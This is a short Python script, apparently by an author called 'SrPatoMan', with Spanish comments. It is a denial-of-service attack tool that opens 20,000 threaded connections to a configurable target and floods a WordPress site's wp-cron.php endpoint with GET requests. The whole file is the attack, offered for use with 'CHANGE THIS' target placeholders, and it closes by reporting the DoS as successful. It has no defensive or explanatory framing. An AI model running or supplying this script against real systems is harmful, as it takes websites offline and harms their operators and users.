################ Author = SrPatoMan ################
### Linkedin: 

import socket
import threading

target_addr = 'example.com' # CHANGE THIS
target_port = '443' # CHANGE THIS IF YOU NEED

# SOCKET CLIENTE
socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# DoS atacando al wp-cron.php 

def DoS():
    
    socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_cliente.connect((target_addr, target_port))
    socket_cliente.send(f"GET /wp-cron.php HTTP/1.1\r\nHost: {target_addr}\r\n\r\n".encode())
    socket_cliente.close()

# CREACION DE MULTIPLES HILOS PARA LA DENEGACIÓN

hilos = []

for _ in range(20000):
    hilo = threading.Thread(target=DoS)
    hilo.start()
    hilos.append(hilo)


for hilos_terminados in hilos:
    hilos_terminados.join()

print("\n\nDoS completado con exito\n\n")
